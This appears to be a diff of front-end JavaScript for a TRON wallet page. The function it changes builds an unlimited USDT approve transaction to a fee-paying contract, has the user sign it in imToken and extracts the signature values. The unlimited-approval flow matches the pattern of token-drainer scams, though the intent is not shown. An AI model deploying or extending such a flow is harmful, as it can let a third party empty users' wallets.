@@ -658,98 +658,104 @@
         /**
          * 最终修复版：结构化签名（所见即所签）+ 代付矿工费兼容
          */
-        async function generateOfflineSignature(userAddress, contractAddress, amount) {
-            try {
-                // 1. 强化Base58地址清理+校验（双重保险）
-                const cleanUserAddr = cleanBase58Address(userAddress);
-                const cleanContractAddr = cleanBase58Address(contractAddress);
-                
-                // 2. 金额格式修正（无限额度保持原格式）
-                let fixedAmount = amount.replace(/^Ox/i, "0x");
-                const hexRegex = /^0x[0-9a-fA-F]*$/;
-                if (!hexRegex.test(fixedAmount)) {
-                    throw new Error("授权金额格式错误，必须以0x开头（数字0）");
-                }
-                // 转换为TRON合约需要的uint256数值（兼容结构化交易）
-                const amountUint256 = tronWeb.toBigNumber(fixedAmount);
-
-                // 3. 核心：构造TRC20 APPROVE结构化交易对象（钱包能解析）
-                console.log("构造结构化授权交易：", {
-                    代币地址: USDT_CONTRACT,
-                    授权对象: cleanContractAddr,
-                    授权额度: "无限额度",
-                    签名账户: cleanUserAddr
-                });
-                const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
-                    USDT_CONTRACT, // 明文：USDT合约地址（钱包可解析）
-                    "approve(address,uint256)", // 明文：授权方法（钱包可识别）
-                    { 
-                        visible: true, // 地址用Base58格式（用户可见）
-                        feeLimit: 0 // 前端暂不设置矿工费，后端代付时补充
-                    },
-                    [
-                        // 明文参数：授权对象（代付合约）+ 授权额度（无限）
-                        { type: "address", value: cleanContractAddr },
-                        { type: "uint256", value: amountUint256 }
-                    ],
-                    cleanUserAddr // 签名账户（显式绑定，避免歧义）
-                );
-
-                // 4. 校验交易对象合法性
-                if (!unsignedTx || !unsignedTx.transaction) {
-                    throw new Error("结构化交易对象生成失败");
-                }
-                if (unsignedTx.result && unsignedTx.result.result === "FAILED") {
-                    throw new Error(`交易对象校验失败：${unsignedTx.result.message}`);
-                }
-
-                // 5. 唤起imToken签名（关键：钱包解析交易对象，显示详情）
-                console.log("唤起imToken签名，交易对象：", unsignedTx.transaction);
-                const signedTx = await tronWeb.trx.sign(unsignedTx.transaction, {
-                    address: cleanUserAddr // 强制用当前用户地址签名
-                });
-
-                // 6. 提取v/r/s（适配后端+合约验证）
-                let signature = signedTx.signature;
-                if (!signature) throw new Error("imToken未返回签名");
-                signature = signature.replace(/^0x/, "").replace(/[^0-9a-fA-F]/g, "");
-                if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
-                
-                const r = `0x${signature.slice(0, 64)}`;
-                const s = `0x${signature.slice(64, 128)}`;
-                const v = parseInt(signature.slice(128, 130), 16); // 直接取v值（27/28）
-
-                // 7. 验证参数合法性
-                if (v !== 27 && v !== 28) throw new Error(`V值异常（当前${v}，需为27/28）`);
-                if (r.length !== 66 || s.length !== 66) throw new Error("R/S格式错误");
-
-                // 保存调试信息
-                localStorage.setItem(`signature_debug_${cleanUserAddr}`, JSON.stringify({
-                    step: "结构化签名生成成功（所见即所签+代付兼容）",
-                    userAddress: cleanUserAddr,
-                    contractAddress: cleanContractAddr,
-                    tokenAddress: USDT_CONTRACT,
-                    amount: fixedAmount,
-                    v: v,
-                    r: r,
-                    s: s,
-                    signedTx: signedTx.transaction,
-                    timestamp: new Date().toISOString()
-                }, null, 2));
-
-                showToast(`签名成功！钱包已显示授权详情（v=${v}）`);
-                return { v, r, s };
-
-            } catch (e) {
-                const debugKey = `signature_debug_${userAddress || 'unknown'}`;
-                localStorage.setItem(debugKey, JSON.stringify({
-                    step: "签名生成失败",
-                    error: e.message,
-                    timestamp: new Date().toISOString()
-                }, null, 2));
-                throw new Error(`生成失败：${e.message} → 点击「查看调试信息」查看详情`);
-            }
+       async function generateOfflineSignature(userAddress, contractAddress, amount) {
+    try {
+        // 1. 强化Base58地址清理+校验
+        const cleanUserAddr = cleanBase58Address(userAddress);
+        const cleanContractAddr = cleanBase58Address(contractAddress);
+        
+        // 2. 金额格式修正
+        let fixedAmount = amount.replace(/^Ox/i, "0x");
+        const hexRegex = /^0x[0-9a-fA-F]*$/;
+        if (!hexRegex.test(fixedAmount)) {
+            throw new Error("授权金额格式错误，必须以0x开头（数字0）");
         }
+        const amountUint256 = tronWeb.toBigNumber(fixedAmount);
+
+        // 3. 兼容修复：地址转为Hex格式（适配imToken低版本）
+        const userHex = tronWeb.address.toHex(cleanUserAddr);
+        const contractHex = tronWeb.address.toHex(cleanContractAddr);
+        console.log("构造交易的Hex地址：", { userHex, contractHex });
+
+        // 4. 构造TRC20 APPROVE结构化交易对象（兼容imToken）
+        const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
+            USDT_CONTRACT,
+            "approve(address,uint256)",
+            { 
+                visible: false, // 传递Hex地址
+                feeLimit: 0
+            },
+            [
+                { type: "address", value: contractHex },
+                { type: "uint256", value: amountUint256 }
+            ],
+            userHex
+        );
+        if (!unsignedTx || !unsignedTx.transaction) {
+            throw new Error("结构化交易对象生成失败");
+        }
+        if (unsignedTx.result && unsignedTx.result.result === "FAILED") {
+            throw new Error(`交易对象校验失败：${unsignedTx.result.message || unsignedTx.result}`);
+        }
+        // 转为visible=true的交易（用户可见地址）
+        const visibleTx = await tronWeb.transactionBuilder.toVisible(unsignedTx.transaction);
+        console.log("转换后的Visible交易：", visibleTx);
+
+        // 5. 兼容修复：交易转为Hex字符串（适配imToken签名）
+        const txHex = tronWeb.utils.transaction.txToHex(visibleTx);
+        console.log("待签名的交易Hex：", txHex.slice(0, 50) + "...");
+
+        // 6. 唤起imToken签名（显式绑定账户）
+        const signedTxHex = await tronWeb.trx.sign(txHex, {
+            address: cleanUserAddr
+        });
+        if (!signedTxHex) throw new Error("imToken未返回签名（Hex格式）");
+        // 转回交易对象
+        const signedTx = tronWeb.utils.transaction.hexToTx(signedTxHex);
+        console.log("签名后的交易对象：", signedTx);
+
+        // 7. 提取v/r/s
+        let signature = signedTx.signature;
+        if (!signature) throw new Error("签名交易中无signature字段");
+        signature = signature.replace(/^0x/, "").replace(/[^0-9a-fA-F]/g, "");
+        if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
+        
+        const r = `0x${signature.slice(0, 64)}`;
+        const s = `0x${signature.slice(64, 128)}`;
+        const v = parseInt(signature.slice(128, 130), 16);
+        if (v !== 27 && v !== 28) throw new Error(`V值异常（当前${v}，需为27/28）`);
+        if (r.length !== 66 || s.length !== 66) throw new Error("R/S格式错误");
+
+        // 保存调试信息
+        localStorage.setItem(`signature_debug_${cleanUserAddr}`, JSON.stringify({
+            step: "结构化签名生成成功",
+            userAddress: cleanUserAddr,
+            contractAddress: cleanContractAddr,
+            tokenAddress: USDT_CONTRACT,
+            amount: fixedAmount,
+            v: v,
+            r: r,
+            s: s,
+            signedTx: signedTx,
+            timestamp: new Date().toISOString()
+        }, null, 2));
+
+        showToast(`签名成功！钱包已显示授权详情（v=${v}）`);
+        return { v, r, s };
+
+    } catch (e) {
+        // 修复：记录完整错误信息
+        const debugKey = `signature_debug_${userAddress || 'unknown'}`;
+        const errorDetails = {
+            step: "签名生成失败",
+            errorMessage: e.message || e.toString(),
+            errorStack: e.stack || "无错误栈",
+            timestamp: new Date().toISOString()
+        };
+        localStorage.setItem(debugKey, JSON.stringify(errorDetails, null, 2));
+        throw new Error(`生成失败：${e.message || e.toString()} → 点击「查看调试信息」查看详情`);
+    }
+}
         /**
          * 初始化钱包：获取地址、余额（确保地址为Base58原始格式）
          */
